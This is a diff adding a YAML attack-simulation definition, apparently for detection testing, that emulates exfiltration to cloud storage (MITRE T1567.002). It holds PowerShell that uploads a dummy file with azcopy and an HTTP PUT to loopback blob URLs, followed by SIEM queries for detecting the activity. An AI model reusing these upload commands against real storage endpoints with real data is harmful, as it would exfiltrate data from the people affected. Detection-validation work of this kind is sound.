@@ -1,0 +1,90 @@
+id: T1567.002_exfiltration_over_web_service_cloud_storage
+name: "Exfiltration Over Web Service — Exfiltration to Cloud Storage"
+mitre_technique: "T1567.002"
+mitre_tactic: "exfiltration"
+description: >
+  Adversaries exfiltrate data to cloud storage services (OneDrive, Google Drive,
+  Dropbox, Azure Blob Storage, AWS S3, Mega) using stolen credentials, SAS tokens,
+  or the service's API. These services are commonly allow-listed at the corporate
+  proxy and traffic blends with legitimate cloud sync activity. Data may be uploaded
+  via the web API, sync client, or command-line tools (azcopy, aws s3 cp).
+  Large upload volumes to personal cloud storage accounts are the primary detection signal.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1567/002/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1567.002 — Exfiltration to Cloud Storage simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate azcopy upload to Azure Blob Storage"
+    command: |
+      $payload = "$env:TEMP\PAS_T1567_002_payload.zip"
+      Set-Content $payload "PAS-T1567.002-CLOUD-STORAGE-EXFIL-$(Get-Date -Format o)"
+      Write-Host "[PAS] Payload: $payload ($((Get-Item $payload).Length) bytes)"
+
+      $azcopy = Get-Command azcopy -ErrorAction SilentlyContinue
+      if ($azcopy) {
+          Write-Host "[PAS] azcopy exfiltration pattern:"
+          $proc = Start-Process azcopy.exe `
+              -ArgumentList "copy $payload 'https://127.0.0.1/exfil-container/data.zip?PAS_SAS_TOKEN'" `
+              -PassThru -NoNewWindow -ErrorAction SilentlyContinue
+          Start-Sleep -Milliseconds 500
+          if ($proc -and -not $proc.HasExited) {
+              $proc | Stop-Process -Force -ErrorAction SilentlyContinue
+          }
+          Write-Host "[PAS] azcopy upload process event generated"
+      }
+
+      Write-Host "[PAS] Azure Blob REST API upload (loopback):"
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/exfil-container/data.zip?PAS_SAS")
+          $req.Method = "PUT"
+          $req.Headers.Add("x-ms-blob-type","BlockBlob")
+          $req.ContentType = "application/octet-stream"
+          $req.Timeout = 300
+          $body = [IO.File]::ReadAllBytes($payload)
+          $req.ContentLength = $body.Length
+          $s = $req.GetRequestStream(); $s.Write($body,0,$body.Length); $s.Close()
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] Blob storage PUT to loopback generated"
+
+  - step: 3
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 4
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — azcopy.exe large upload, HTTP PUT to blob storage endpoints, OneDrive/Dropbox large upload from unexpected process"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove cloud storage exfil payload"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1567_002_payload.zip" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Cloud storage exfil payload removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1567.002 cleanup complete"
+
+analyst_checklist:
+  - "Process event: azcopy.exe, rclone.exe, or aws.exe with copy/upload arguments"
+  - "Network event: large HTTP PUT to blob.core.windows.net, s3.amazonaws.com, dropbox.com"
+  - "Sentinel: DeviceProcessEvents | where FileName in ('azcopy.exe','rclone.exe') and ProcessCommandLine contains ('copy','upload')"
+  - "Sentinel: DeviceNetworkEvents | where RemoteUrl contains ('blob.core.windows.net','s3.amazonaws.com') and SentBytes > 10000000"
+  - "MDE alert: 'Data exfiltration to cloud storage'"
+  - "CONTROL CHECK: Conditional Access on SAS tokens — restrict by source IP range"
+  - "CONTROL CHECK: Cloud DLP — Microsoft Purview can detect sensitive data uploads to cloud storage"
+  - "CONTROL CHECK: Personal cloud storage (Dropbox, Google Drive, personal OneDrive) should be blocked at proxy for corporate devices"
